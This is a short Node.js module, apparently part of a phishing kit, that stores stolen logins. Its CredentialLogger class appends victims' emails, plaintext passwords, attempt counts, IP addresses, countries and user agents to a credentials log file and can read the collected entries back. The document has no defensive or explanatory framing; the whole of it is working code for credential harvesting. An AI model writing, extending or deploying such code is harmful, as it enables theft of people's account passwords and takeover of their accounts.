const fs = require('fs-extra');
const path = require('path');

class CredentialLogger {
  constructor() {
    this.logFile = path.join(__dirname, '../logs/credentials.txt');
  }

  async logCredentials(credentials, visitorInfo) {
    const logEntry = this.formatLogEntry(credentials, visitorInfo);
    
    try {
      await fs.ensureDir(path.dirname(this.logFile));
      await fs.appendFile(this.logFile, logEntry);
      console.log('Credentials logged to file');
    } catch (error) {
      console.error('Failed to log credentials:', error);
    }
  }

  formatLogEntry(credentials, visitorInfo) {
    return `
=====================================
TIMESTAMP: ${new Date().toISOString()}
ATTEMPT: ${credentials.attempt}
EMAIL: ${credentials.username}
PASSWORD: ${credentials.password}
IP: ${visitorInfo.ip}
COUNTRY: ${visitorInfo.country || 'Unknown'}
USER_AGENT: ${visitorInfo.userAgent}
=====================================

`;
  }

  async getCredentials() {
    try {
      const content = await fs.readFile(this.logFile, 'utf8');
      return content;
    } catch (error) {
      return 'No credentials logged yet.';
    }
  }
}

module.exports = CredentialLogger;